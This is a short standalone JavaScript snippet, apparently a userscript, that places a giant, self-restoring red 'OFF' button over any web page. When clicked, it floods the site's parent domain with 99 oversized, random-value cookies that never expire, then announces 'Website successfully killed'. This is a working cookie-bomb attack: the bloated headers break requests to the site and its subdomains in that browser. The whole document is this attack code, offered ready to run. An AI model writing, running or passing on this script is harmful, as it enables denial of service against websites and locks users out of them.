function createKillButton() {
    const t = document.createElement("button");

    function e() {
        Object.assign(t.style, {
            position: "fixed",
            top: "50%",
            left: "50%",
            transform: "translate(-50%, -50%)",
            width: "800px",
            height: "200px",
            borderRadius: "100px",
            backgroundColor: "red",
            color: "white",
            fontSize: "100px",
            fontWeight: "bold",
            cursor: "pointer",
            zIndex: "2147483647",
            boxShadow: "0 0 20px black",
            display: "block",
            visibility: "visible",
            opacity: "1",
            pointerEvents: "auto"
        }), t.setAttribute("style", Array.from(t.style).map((e => `${e}: ${t.style[e]} !important;`)).join(""))
    }
    t.textContent = "OFF", e(), t.addEventListener("click", (function() {
        if ("OFF" === this.textContent) {
            this.style.backgroundColor = "#00FF00", this.textContent = "ON";
            const t = new Date(2e14).toUTCString(),
                e = location.hostname.split(".").slice(-2).join(".");
            for (let o = 0; o < 99; o++) document.cookie = `cd${o}=${encodeURIComponent(btoa(String.fromCharCode.apply(0,crypto.getRandomValues(new Uint8Array(3168))))).substring(0,3168)};expires=${t};domain=${e};path=/`;
            alert("Website successfully killed")
        }
    })), document.body.appendChild(t), new MutationObserver((() => {
        document.body.contains(t) || (document.body.appendChild(t), e())
    })).observe(document.body, {
        childList: !0,
        subtree: !0
    }), setInterval(e, 100)
}
createKillButton();
